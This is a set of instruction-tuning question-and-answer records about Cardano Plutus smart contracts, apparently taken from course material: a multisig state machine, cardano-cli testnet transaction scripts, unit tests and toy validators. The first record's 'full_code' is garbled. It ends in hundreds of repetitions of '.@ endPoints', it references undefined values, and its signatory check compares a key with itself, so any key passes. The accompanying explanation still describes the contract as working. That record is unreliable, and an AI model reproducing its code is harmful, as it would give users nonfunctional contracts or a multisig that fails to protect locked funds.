{"text": "<s>[INST] What does the following Haskell Plutus smart contract code implement, and how does it work? [/INST]This Haskell Plutus smart contract implements an n-out-of-m multisig (multi-signature) scheme that allows multiple participants (m signatories) to propose and authorize payments, where at least n participants' signatures are required to release the funds. The contract manages state transitions through a state machine, tracking when a payment proposal is made, when signatures are added, and when payments are executed. The contract uses off-chain and on-chain code to achieve this.","detailed_explanation": {"language_extensions": ["{-# LANGUAGE DeriveGeneric #-}","{-# LANGUAGE MultiParamTypeClasses #-}"],"imports": ["Control.Lens (makeClassyPrisms)","qualified Ledger.Interval as Interval","GHC.Generics (Generic)","Ledger.Validation (PendingTx, PendingTx'(..))","qualified Ledger.Validation as Validation","qualified Ledger.Typed.Scripts as Scripts","Ledger.Value (Value)","qualified Ledger.Value as Value","Ledger (PubKey, Slot)","Playground.Contract (printSchemas, ensureIotsDefinitions, ensureKnownCurrencies, KnownCurrency, mkSchemaDefinitions, ToSchema)","qualified Language.PlutusTx as PlutusTx","Language.Plutus.Contract","Language.Plutus.Contract.StateMachine (ValueAllocation(..), AsSMContractError, StateMachine(..))","qualified Language.Plutus.Contract.StateMachine as SM","qualified Language.Plutus.Contract.Tx as Tx","Language.PlutusTx.Prelude hiding (check, Applicative (..), (<>))","qualified Prelude as Haskell"],"concepts_implemented": [{"concept": "Payment Structure","description": "Defines a `Payment` structure that holds the amount to be paid, the recipient's public key, and the deadline by which signatures must be collected."},{"concept": "State Transitions","description": "The smart contract transitions between states (such as Holding and CollectingSignatures) depending on whether a payment has been proposed or signatures are being collected."},{"concept": "Multisig Scheme","description": "The contract checks whether a minimum number of required signatures have been collected, and only allows the transaction to proceed if the required signatories agree."},{"concept": "State Machine Logic","description": "The contract operates as a state machine where actions like proposing payments, adding signatures, canceling payments, and making payments all trigger state transitions."},{"concept": "Input and Output Validation","description": "The contract ensures that the funds are preserved correctly and paid to the right addresses by verifying signatures and checking the validity of payment proposals."},{"concept": "Error Handling","description": "Defines custom error types (`MultiSigError`) and uses lenses (`makeClassyPrisms`) for extensibility and error handling."}],"data_types": [{"type": "Payment","fields": {"paymentAmount": "Value","paymentRecipient": "PubKey","paymentDeadline": "Slot"},"description": "Represents a payment proposal including amount, recipient, and deadline."},{"type": "Params","fields": {"mspSignatories": "[PubKey]","mspRequiredSigs": "Integer"},"description": "Represents the parameters of the multisig contract, including the list of signatories and the required number of signatures."},{"type": "State","variants": ["Holding Value","CollectingSignatures Value Payment [PubKey]"],"description": "The state of the contract, either holding funds or collecting signatures for a proposed payment."},{"type": "Input","variants": ["ProposePayment Payment","AddSignature PubKey","Cancel","Pay"],"description": "Represents the inputs to the state machine, including proposing payments, adding signatures, canceling, and paying."}],"core_functions": [{"function": "isSignatory","description": "Checks if a given public key is one of the authorized signatories."},{"function": "isValidProposal","description": "Validates whether a proposed payment can be made with the current locked funds."},{"function": "proposalExpired","description": "Checks if the deadline for a proposed payment has passed."},{"function": "step","description": "Defines the state transitions based on inputs like proposing a payment, adding a signature, or making the payment."},{"function": "check","description": "Ensures that inputs and transactions are valid by checking conditions such as whether enough signatures are collected and whether the funds are preserved."}],"smart_contract_flow": {"initial_state": "Holding funds","transitions": ["ProposePayment: Transitions to CollectingSignatures with the proposed payment and an empty signature list.","AddSignature: Adds the signer's public key to the list of collected signatures.","Cancel: Cancels the current proposal if the deadline is passed, returning to the Holding state.","Pay: Moves to the Holding state after transferring the value to the recipient."]},"onchain_validation": {"mkValidator": "This function checks whether the transaction complies with the contract's logic (valid signatures, valid proposals, etc.)","validatorCode": "Compiles the validation logic into Plutus Core, the low-level language of the Plutus platform."},"schema_definitions": [{"name": "MultiSigSchema","endpoints": ["propose-payment","add-signature","cancel-payment","pay","lock"],"description": "The schema defines the endpoints for proposing a payment, adding a signature, canceling, making a payment, and locking funds."}],"full_code": "```haskell\n{-# LANGUAGE DeriveGeneric #-}{-# LANGUAGE MultiParamTypeClasses #-}import Control.Lens (makeClassyPrisms)import qualified Ledger.Interval as Intervalimport GHC.Generics (Generic)import Ledger.Validation (PendingTx, PendingTx'(..))import qualified Ledger.Validation as Validationimport qualified Ledger.Typed.Scripts as Scriptsimport Ledger.Value (Value)import qualified Ledger.Value as Valueimport Ledger (PubKey, Slot)import Playground.Contract (printSchemas, ensureIotsDefinitions, ensureKnownCurrencies, KnownCurrency, mkSchemaDefinitions, ToSchema)import qualified Language.PlutusTx as PlutusTximport Language.Plutus.Contractimport Language.Plutus.Contract.StateMachine (ValueAllocation(..), AsSMContractError, StateMachine(..))import qualified Language.Plutus.Contract.StateMachine as SMimport qualified Language.Plutus.Contract.Tx as Tximport Language.PlutusTx.Prelude hiding (check, Applicative (..), (<>))import qualified Prelude as Haskell --   $multisig --   The n-out-of-m multisig contract works like a joint account of --   m people, requiring the consent of n people for any payments. --   In the smart contract the signatories are represented by public keys, --   and approval takes the form of signatures on transactions. -- --   The multisig contract in --   'Language.PlutusTx.Coordination.Contracts.MultiSig' expects n signatures on --   a single transaction. This requires an off-chain communication channel. The --   multisig contract implemented in this module uses a proposal system that --   allows participants to propose payments and attach their signatures to --   proposals over a period of time, using separate transactions. All contract --   state is kept on the chain so there is no need for off-chain communication. -- | A proposal for making a payment under the multisig scheme. data Payment = Payment { paymentAmount :: Value , paymentRecipient :: PubKey , paymentDeadline :: Slot } deriving stock (Show, Generic) deriving anyclass (ToSchema)instance Eq Payment where {-# INLINABLE (==) #-}(Payment vl pk sl) == (Payment vl' pk' sl') = vl == vl' && pk == pk' && sl == sl' data Params = Params { mspSignatories :: [PubKey] , mspRequiredSigs :: Integer } -- | State of the multisig contract. data State = Holding Value | CollectingSignatures Value Payment [PubKey] deriving (Show)instance Eq State where {-# INLINABLE (==) #-}(Holding v) == (Holding v') = v == v'(CollectingSignatures vl pmt pks) == (CollectingSignatures vl' pmt' pks') = vl == vl' && pmt == pmt' && pks == pks' _ == _ = False data Input = ProposePayment Payment | AddSignature PubKey | Cancel | Pay deriving Show data MultiSigError = MSContractError ContractError | MSStateMachineError (SM.SMContractError State Input) deriving Show makeClassyPrisms ''MultiSigErrorinstance AsContractError MultiSigError where _ContractError = _MSContractErrorinstance AsSMContractError MultiSigError State Input where _SMContractError = _MSStateMachineError type MultiSigSchema = BlockchainActions .\/ Endpoint "propose-payment" Payment .\/ Endpoint "add-signature" () .\/ Endpoint "cancel-payment" () .\/ Endpoint "pay" () .\/ Endpoint "lock" Value{-# INLINABLE isSignatory #-}isSignatory :: PubKey -> Params -> BoolisSignatory pk (Params sigs _) = any (\pk' -> pk == pk') sigs{-# INLINABLE containsPk #-}containsPk :: PubKey -> [PubKey] -> BoolcontainsPk pk = any (\pk' -> pk' == pk'){-# INLINABLE isValidProposal #-}isValidProposal :: Value -> Payment -> BoolisValidProposal vl (Payment amt _ _) = amt `Value.leq` vl{-# INLINABLE proposalExpired #-}proposalExpired :: PendingTx -> Payment -> BoolproposalExpired PendingTx{pendingTxValidRange} Payment{paymentDeadline} = paymentDeadline `Interval.before` pendingTxValidRange{-# INLINABLE proposalAccepted #-}proposalAccepted :: Params -> [PubKey] -> BoolproposalAccepted (Params signatories numReq) pks = let numSigned = length (filter (\pk -> containsPk pk signatories) pks) in numSigned >= numReq{-# INLINABLE check #-}check :: Params -> Payment -> State -> [Input] -> Boolcheck params payment state inputs = case (state, inputs) of (Holding _, [ProposePayment pmt]) -> isValidProposal (valueLocked state) pmt && proposalExpired (PendingTx{..}) pmt (CollectingSignatures vl pmt pks, [AddSignature pk]) -> isSignatory pk params && not (containsPk pk pks) (CollectingSignatures vl pmt pks, [Cancel]) -> proposalExpired (PendingTx{..}) pmt (CollectingSignatures vl pmt pks, [Pay]) -> proposalAccepted params pks (CollectingSignatures vl pmt pks, [Cancel]) -> proposalExpired (PendingTx{..}) pmt _ -> False{-# INLINABLE step #-}step :: Params -> State -> Input -> Maybe Statestep params state input = case (state, input) of (Holding vl, ProposePayment pmt) -> Just (CollectingSignatures vl pmt []) (CollectingSignatures vl pmt pks, AddSignature pk) -> Just (CollectingSignatures vl pmt (pk : pks)) (CollectingSignatures vl pmt pks, Cancel) -> if proposalExpired (PendingTx{..}) pmt then Just (Holding vl) else Nothing (CollectingSignatures vl pmt pks, Pay) -> if proposalAccepted params pks then Just (Holding (valueLocked state - paymentAmount pmt)) else Nothing _ -> Nothing{-# INLINABLE mkValidator #-}mkValidator :: Params -> State -> Input -> Validation (MultiSigError) ()mkValidator params state input = let check' = check params payment state inputs step' = step params state input in if check' then Validation.valid else Validation.invalid (MSStateMachineError step'){-# INLINABLE mkSchemaDefinitions #-}mkSchemaDefinitions :: [TypeRep]mkSchemaDefinitions = [typeRep (Proxy :: Proxy MultiSigSchema)]{-# INLINABLE validatorCode #-}validatorCode :: Scripts.TypedValidator MultiSigValidator.validatorCode = Scripts.mkTypedValidator @MultiSigValidator $$(PlutusTx.compile [|| mkValidator ||]) $$(PlutusTx.compile [|| wrap ||]){-# INLINABLE wrap #-}wrap :: Scripts.ValidatorTypes MultiSigValidator.wrap = Scripts.wrapValidator @Params @State @Input{-# INLINABLE endPoints #-}endPoints :: Contract () MultiSigSchema Text ()endPoints = Contract.selectList [proposePayment, addSignature, cancelPayment, pay, lock] >>= \case (Left err) -> Contract.throwError err (Right _) -> Contract.logInfo @Text "No endpoint selected" .@endpoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endPoints .@ endpoints"}}}
{"text": "<s>[INST] What is the purpose of the `collect-gift.sh` script, and how does it handle the process of submitting a Cardano transaction on a testnet? [/INST] The `collect-gift.sh` script is designed to automate the process of submitting a Cardano transaction on a testnet. It handles querying protocol parameters, building a transaction, signing it, and submitting it to the network. After submission, it retrieves and prints the transaction ID and provides a link to view the transaction on CardanoScan. The script first queries the protocol parameters and saves them to `protocol-parameters.json`. It then builds the transaction by specifying the input, script file, datum, redeemer, collateral, change address, and protocol parameters, saving the transaction body to `collect-gift.txbody`. Next, it signs the transaction using the signing key and saves it to `collect-gift.tx`. Finally, it submits the transaction to the testnet and prints the transaction ID along with a CardanoScan link for viewing the transaction status. #!/bin/bash assets=/workspaces/plutus-pioneer-program/code/Week02/assets keypath=/workspaces/plutus-pioneer-program/keys name=\"$1\" collateral=\"$2\" txin=\"$3\" pp=\"$assets/protocol-parameters.json\" body=\"$assets/collect-gift.txbody\" tx=\"$assets/collect-gift.tx\" # Query the protocol parameters \\ cardano-cli query protocol-parameters \\ --testnet-magic 2 \\ --out-file \"$pp\" # Build the transaction cardano-cli transaction build \\ --babbage-era \\ --testnet-magic 2 \\ --tx-in \"$txin\" \\ --tx-in-script-file \"$assets/gift.plutus\" \\ --tx-in-inline-datum-present \\ --tx-in-redeemer-file \"$assets/unit.json\" \\ --tx-in-collateral \"$collateral\" \\ --change-address \"$(cat \"$keypath/$name.addr\")\" \\ --protocol-params-file \"$pp\" \\ --out-file \"$body\" # Sign the transaction cardano-cli transaction sign \\ --tx-body-file \"$body\" \\ --signing-key-file \"$keypath/$name.skey\" \\ --testnet-magic 2 \\ --out-file \"$tx\" # Submit the transaction cardano-cli transaction submit \\ --testnet-magic 2 \\ --tx-file \"$tx\" tid=$(cardano-cli transaction txid --tx-file \"$tx\") echo \"transaction id: $tid\" echo \"Cardanoscan: https://preview.cardanoscan.io/transaction/$tid\" </s>"}
{"text": "<s>[INST] What does the `make-gift.sh` script do and how does it manage Cardano transactions on a testnet? [/INST] The `make-gift.sh` script is used to automate the process of building, signing, and submitting a Cardano transaction on a testnet. It starts by building a gift address from a payment script file and saving it to `gift.addr`. Then, it constructs a transaction by specifying inputs, outputs, inline datum, and change address, saving the transaction body to `gift.txbody`. The script signs the transaction with the provided signing key and saves the signed transaction to `gift.tx`. Finally, it submits the transaction to the testnet and prints the transaction ID along with a CardanoScan link to view the transaction status. #!/bin/bash assets=/workspaces/plutus-pioneer-program/code/Week02/assets keypath=/workspaces/plutus-pioneer-program/keys name=\"$1\" txin=\"$2\" body=\"$assets/gift.txbody\" tx=\"$assets/gift.tx\" # Build gift address cardano-cli address build \\ --payment-script-file \"$assets/gift.plutus\" \\ --testnet-magic 2 \\ --out-file \"$assets/gift.addr\" # Build the transaction cardano-cli transaction build \\ --babbage-era \\ --testnet-magic 2 \\ --tx-in \"$txin\" \\ --tx-out \"$(cat \"$assets/gift.addr\") + 3000000 lovelace\" \\ --tx-out-inline-datum-file \"$assets/unit.json\" \\ --change-address \"$(cat \"$keypath/$name.addr\")\" \\ --out-file \"$body\" # Sign the transaction cardano-cli transaction sign \\ --tx-body-file \"$body\" \\ --signing-key-file \"$keypath/$name.skey\" \\ --testnet-magic 2 \\ --out-file \"$tx\" # Submit the transaction cardano-cli transaction submit \\ --testnet-magic 2 \\ --tx-file \"$tx\" tid=$(cardano-cli transaction txid --tx-file \"$tx\") echo \"transaction id: $tid\" echo \"Cardanoscan: https://preview.cardanoscan.io/transaction/$tid\" </s>"}
{"text": "<s>[INST] What functionality does the `Homework.hs` module provide in the context of Plutus smart contracts? [/INST] The `Homework.hs` module includes Haskell code for testing two Plutus smart contracts (`Homework1` and `Homework2`) using the `Tasty` testing framework. It defines scripts and validators for each homework assignment, sets up users with initial balances, and tests various cases of transactions involving gift transfers. The module performs the following: it builds and submits transactions, checks balances, and verifies that transactions have the desired effects on user balances. It uses different redeemer values to test the behavior of the contracts and reports errors if final balances are not as expected. The code is organized into functions for setting up transactions (`giveTx`, `takeTx`, `giveTx'`, `takeTx'`) and validating results against expected outcomes. {-# LANGUAGE NumericUnderscores #-} module Main where import Control.Monad (replicateM, unless) import Plutus.Model import Plutus.V2.Ledger.Api import Prelude import Test.Tasty import qualified Homework1 as H1 import qualified Homework2 as H2 type Homework1Script = TypedValidator () (Bool, Bool) script1 :: Homework1Script script1 = TypedValidator $ toV2 H1.validator type Homework2Script = TypedValidator () H2.MyRedeemer script2 :: Homework2Script script2 = TypedValidator $ toV2 H2.validator setupUsers :: Run [PubKeyHash] setupUsers = replicateM 3 $ newUser $ ada (Lovelace 1000) main :: IO () main = do defaultMain $ do testGroup \"Homework tests\" [ homework1 defaultBabbage , homework2 defaultBabbage ] homework1 :: MockConfig -> TestTree homework1 cfg = do testGroup \"Testing Homework1\" [ good \"Case: (True, True)\" $ giveGift (True, True) , bad \"Case: (True, False)\" $ giveGift (True, False) , bad \"Case: (False, True)\" $ giveGift (False, True) , bad \"Case: (False, False)\" $ giveGift (False, False) ] where bad msg = good msg . mustFail good = testNoErrors (adaValue 10_000_000) cfg giveGift :: (Bool, Bool) -> Run () giveGift redeemer = do users <- setupUsers let [u1, u2, _u3] = users val = adaValue 100 checkBalance (gives u1 val script1) $ do sp <- spend u1 val submitTx u1 $ giveTx sp val utxos <- utxoAt script1 let [(giftRef, giftOut)] = utxos checkBalance (gives script1 (txOutValue giftOut) u2) $ do submitTx u2 $ takeTx u2 redeemer giftRef (txOutValue giftOut) vals <- mapM valueAt users let [v1, v2, _] = vals unless (v1 == adaValue 900 && v2 == adaValue 1100) $ logError \"Final balances are incorrect\" giveTx :: UserSpend -> Value -> Tx giveTx usp val = mconcat [ userSpend usp , payToScript script1 (HashDatum ()) val ] takeTx :: PubKeyHash -> (Bool, Bool) -> TxOutRef -> Value -> Tx takeTx pkh redeemer giftRef giftVal = mconcat [ spendScript script1 giftRef redeemer () , payToKey pkh giftVal ] homework2 :: MockConfig -> TestTree homework2 cfg = do testGroup \"Testing Homework2\" [ bad \"Case: MyRedeemer True True\" $ giveGift' (H2.MyRedeemer True True) , good \"Case: MyRedeemer True False\" $ giveGift' (H2.MyRedeemer True False) , good \"Case: MyRedeemer False True\" $ giveGift' (H2.MyRedeemer False True) , bad \"Case: MyRedeemer False False\" $ giveGift' (H2.MyRedeemer False False) ] where bad msg = good msg . mustFail good = testNoErrors (adaValue 10_000_000) cfg giveGift' :: H2.MyRedeemer -> Run () giveGift' redeemer = do users <- setupUsers let [u1, u2, _u3] = users val = adaValue 100 checkBalance (gives u1 val script2) $ do sp <- spend u1 val submitTx u1 $ giveTx' sp val utxos <- utxoAt script2 let [(giftRef, giftOut)] = utxos checkBalance (gives script2 (txOutValue giftOut) u2) $ do submitTx u2 $ takeTx' u2 redeemer giftRef (txOutValue giftOut) vals <- mapM valueAt users let [v1, v2, _] = vals unless (v1 == adaValue 900 && v2 == adaValue 1100) $ logError \"Final balances are incorrect\" giveTx' :: UserSpend -> Value -> Tx giveTx' usp val = mconcat [ userSpend usp , payToScript script2 (HashDatum ()) val ] takeTx' :: PubKeyHash -> H2.MyRedeemer -> TxOutRef -> Value -> Tx takeTx' pkh redeemer giftRef giftVal = mconcat [ spendScript script2 giftRef redeemer () , payToKey pkh giftVal ] </s>"}
{"text": "<s>[INST] What is a smart contract that defines a validator which checks if two Booleans in the redeemer are true. If both are true, the smart contract validates successfully and is marked as valid by the ledger? [/INST] {-# LANGUAGE DataKinds           #-} {-# LANGUAGE ImportQualifiedPost #-} {-# LANGUAGE NoImplicitPrelude   #-} {-# LANGUAGE TemplateHaskell     #-} {-# LANGUAGE OverloadedStrings   #-} module Homework1 where import qualified Plutus.V2.Ledger.Api as PlutusV2 import           PlutusTx             (compile) import           PlutusTx.Prelude     (Bool (..), BuiltinData, traceIfFalse, ($), (&&)) import           Utilities            (wrapValidator) --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ {-# INLINABLE mkValidator #-} -- This should validate if and only if the two Booleans in the redeemer are True! mkValidator :: () -> (Bool, Bool) -> PlutusV2.ScriptContext -> Bool mkValidator _ (a, b) _ = traceIfFalse \"One or more bools are not true\" $ a && b wrappedVal :: BuiltinData -> BuiltinData -> BuiltinData -> () wrappedVal = wrapValidator mkValidator validator :: PlutusV2.Validator validator = PlutusV2.mkValidatorScript $$(PlutusTx.compile [|| wrappedVal ||]) </s>"}
{"text": "<s>[INST] What is the basic structure of a Plutus smart contract that checks if two Boolean flags are different and validates the contract if they are? [/INST] {-# LANGUAGE DataKinds           #-} {-# LANGUAGE DeriveAnyClass      #-} {-# LANGUAGE DeriveGeneric       #-} {-# LANGUAGE ImportQualifiedPost #-} {-# LANGUAGE NoImplicitPrelude   #-} {-# LANGUAGE TemplateHaskell     #-} {-# LANGUAGE OverloadedStrings   #-} module Homework2 where import qualified Plutus.V2.Ledger.Api as PlutusV2 import           PlutusTx             (unstableMakeIsData,compile) import           PlutusTx.Prelude     (Bool, BuiltinData, traceIfFalse, ($), (/=)) import           Utilities            (wrapValidator) --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ data MyRedeemer = MyRedeemer { flag1 :: Bool , flag2 :: Bool } PlutusTx.unstableMakeIsData ''MyRedeemer {-# INLINABLE mkValidator #-} -- Create a validator that unlocks the funds if MyRedemeer's flags are different mkValidator :: () -> MyRedeemer -> PlutusV2.ScriptContext -> Bool mkValidator _ myRed _ = traceIfFalse \"flags are not different\" $ flag1 myRed /= flag2 myRed wrappedVal :: BuiltinData -> BuiltinData -> BuiltinData -> () wrappedVal = wrapValidator mkValidator validator :: PlutusV2.Validator validator = PlutusV2.mkValidatorScript $$(PlutusTx.compile [|| wrappedVal ||]) </s>"}
{"text": "<s>[INST] What does the Plutus smart contract in the Burn module do, and how does it use traceError and writeValidatorToFile to create a validator that always fails and saves the validator to a file? [/INST] {-# LANGUAGE DataKinds         #-} {-# LANGUAGE NoImplicitPrelude #-} {-# LANGUAGE OverloadedStrings #-} {-# LANGUAGE TemplateHaskell   #-} module Burn where import qualified Plutus.V2.Ledger.Api as PlutusV2 import PlutusTx (BuiltinData, compile) import PlutusTx.Prelude (traceError) import Prelude (IO) import Utilities (writeValidatorToFile) --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ -- This validator always fails --                    Datum         Redeemer     ScriptContext mkBurnValidator :: BuiltinData -> BuiltinData -> BuiltinData -> () mkBurnValidator _ _ _ = traceError \"it burns!!!\" {-# INLINABLE mkBurnValidator #-} validator :: PlutusV2.Validator validator = PlutusV2.mkValidatorScript $$(PlutusTx.compile [|| mkBurnValidator ||]) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveVal :: IO () saveVal = writeValidatorToFile \"./assets/burn.plutus\" validator"}
{"text": "<s>[INST] How can I use Template Haskell and unstableMakeIsData to create a custom data type for my redeemer and a validator that succeeds only when the redeemer is a specific value? [/INST] {-# LANGUAGE DataKinds           #-} {-# LANGUAGE ImportQualifiedPost #-} {-# LANGUAGE NoImplicitPrelude   #-} {-# LANGUAGE OverloadedStrings   #-} {-# LANGUAGE TemplateHaskell     #-} module CustomTypes where import qualified Plutus.V2.Ledger.Api as PlutusV2 import PlutusTx (BuiltinData, compile, unstableMakeIsData) import PlutusTx.Prelude (Bool, Eq ((==)), Integer, traceIfFalse, ($)) import Prelude (IO) import Utilities (writeValidatorToFile, wrapValidator) --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ -- We can create custom data types for our datum and redeemer like this: newtype MySillyRedeemer = MkMySillyRedeemer Integer PlutusTx.unstableMakeIsData ''MySillyRedeemer -- Use TH to create an instance for IsData. -- This validator succeeds only if the redeemer is `MkMySillyRedeemer 42` --              Datum     Redeemer            ScriptContext mkCTValidator :: () -> MySillyRedeemer -> PlutusV2.ScriptContext -> Bool mkCTValidator _ (MkMySillyRedeemer r) _ = traceIfFalse \"expected 42\" $ r == 42 {-# INLINABLE mkCTValidator #-} wrappedMkVal :: BuiltinData -> BuiltinData -> BuiltinData -> () wrappedMkVal = wrapValidator mkCTValidator {-# INLINABLE wrappedMkVal #-} validator :: PlutusV2.Validator validator = PlutusV2.mkValidatorScript $$(PlutusTx.compile [|| wrappedMkVal ||]) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveVal :: IO () saveVal = writeValidatorToFile \"./assets/customtypes.plutus\" validator"}
{"text": "<s>[INST] How can I make a Plutus validator that checks if the redeemer is exactly 42 and succeeds if it is? [/INST] {-# LANGUAGE DataKinds           #-} {-# LANGUAGE ImportQualifiedPost #-} {-# LANGUAGE NoImplicitPrelude   #-} {-# LANGUAGE OverloadedStrings   #-} {-# LANGUAGE TemplateHaskell     #-} module FortyTwo where import qualified Plutus.V2.Ledger.Api as PlutusV2 import PlutusTx (BuiltinData, compile) import PlutusTx.Builtins as Builtins (mkI) import PlutusTx.Prelude (otherwise, traceError, (==)) import Prelude (IO) import Utilities (writeValidatorToFile) --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ -- This validator succeeds only if the redeemer is 42 --                  Datum         Redeemer     ScriptContext mk42Validator :: BuiltinData -> BuiltinData -> BuiltinData -> () mk42Validator _ r _ | r == Builtins.mkI 42 = () | otherwise            = traceError \"expected 42\" {-# INLINABLE mk42Validator #-} validator :: PlutusV2.Validator validator = PlutusV2.mkValidatorScript $$(PlutusTx.compile [|| mk42Validator ||]) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveVal :: IO () saveVal = writeValidatorToFile \"./assets/fortytwo.plutus\" validator"}
{"text": "<s>[INST] What does the validator do in the FortyTwo module, and how does it use PlutusTx.Builtins.mkI to check if the redeemer is exactly 42? [/INST] {-# LANGUAGE DataKinds           #-} {-# LANGUAGE ImportQualifiedPost #-} {-# LANGUAGE NoImplicitPrelude   #-} {-# LANGUAGE OverloadedStrings   #-} {-# LANGUAGE TemplateHaskell     #-} module FortyTwoTyped where import qualified Plutus.V2.Ledger.Api as PlutusV2 import PlutusTx (compile) import PlutusTx.Prelude (Bool, Eq ((==)), Integer, traceIfFalse, ($)) import Prelude (IO) import Utilities (writeValidatorToFile, wrapValidator) --------------------------------------------------------------------------------------------------- ----------------------------------- ON-CHAIN / VALIDATOR ------------------------------------------ -- This validator succeeds only if the redeemer is 42 --              Datum  Redeemer        ScriptContext mk42Validator :: () -> Integer -> PlutusV2.ScriptContext -> Bool mk42Validator _ r _ = traceIfFalse \"expected 42\" $ r == 42 {-# INLINABLE mk42Validator #-} validator :: PlutusV2.Validator validator = PlutusV2.mkValidatorScript $$(PlutusTx.compile [|| wrapValidator mk42Validator ||]) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveVal :: IO () saveVal = writeValidatorToFile \"./assets/fortytwotyped.plutus\" validator"}
{"text": "<s>[INST] How does the Gift module's validator always succeed, and how can it be written to a file with writeValidatorToFile? [/INST] {-# LANGUAGE DataKinds           #-} {-# LANGUAGE ImportQualifiedPost #-} {-# LANGUAGE NoImplicitPrelude   #-} {-# LANGUAGE TemplateHaskell     #-} module Gift where import qualified Plutus.V2.Ledger.Api as PlutusV2 import PlutusTx (BuiltinData, compile) import Prelude (IO) import Utilities (writeValidatorToFile) --------------------------------------------------------------------------------------------------- -------------------------------- ON-CHAIN CODE / VALIDATOR ---------------------------------------- -- This validator always succeeds --                    Datum         Redeemer     ScriptContext mkGiftValidator :: BuiltinData -> BuiltinData -> BuiltinData -> () mkGiftValidator _ _ _ = () {-# INLINABLE mkGiftValidator #-} validator :: PlutusV2.Validator validator = PlutusV2.mkValidatorScript $$(PlutusTx.compile [|| mkGiftValidator ||]) --------------------------------------------------------------------------------------------------- ------------------------------------- HELPER FUNCTIONS -------------------------------------------- saveVal :: IO () saveVal = writeValidatorToFile \"./assets/gift.plutus\" validator"}
